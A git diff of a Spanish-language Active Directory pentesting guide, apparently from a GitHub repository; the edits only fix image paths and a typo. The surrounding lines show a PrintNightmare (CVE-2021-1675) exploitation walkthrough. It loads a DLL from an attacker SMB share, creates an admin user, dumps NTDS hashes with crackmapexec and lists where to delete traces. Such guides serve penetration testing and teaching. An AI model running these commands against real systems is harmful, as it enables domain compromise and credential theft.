@@ -16,7 +16,7 @@ impacket-smbserver -smb2support ATTACKERSHARE .
 python3 CVE-2021-1675.py <dominio>/<user>:'<pass>'@<DNS del equipo victima> '\\<Nuestra IP>\ATTACKERSHARE\pnightmare2.dll'
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/pritnightmare/vid.gif?raw=true "Check de printnighmare y esploit")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/pritnightmare/files/vid.gif?raw=true "Check de printnighmare y esploit")
 
 ```Bash
 # Comprobación de que el usuario printnighmare con permisos de administrador ha sido creado
@@ -27,12 +27,12 @@ cme smb <IP víctima> -u pnightmare2 -p 'Test123456789!' --ntds
  
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/printnighmare/vid2.gif?raw=true "Explotar el nuevo usuario")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/printnighmare/files/vid2.gif?raw=true "Explotar el nuevo usuario")
 
 
 ## Para eliminar el rastro ver:
 [Añadir/Eliminar usuarios](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/utilities/add_remove_users)
-## PAra borrar las ddl se encuentran en las siguietnes ubicaciones de windows con el nombre de printnighmare*.dll
+## Para borrar las ddl se encuentran en las siguietnes ubicaciones de windows con el nombre de printnighmare*.dll
 ```Bash
 C:\Windows\System32\spool\drivers\x64\3
 C:\Windows\System32\spool\drivers\x64\3\Old\{id}\
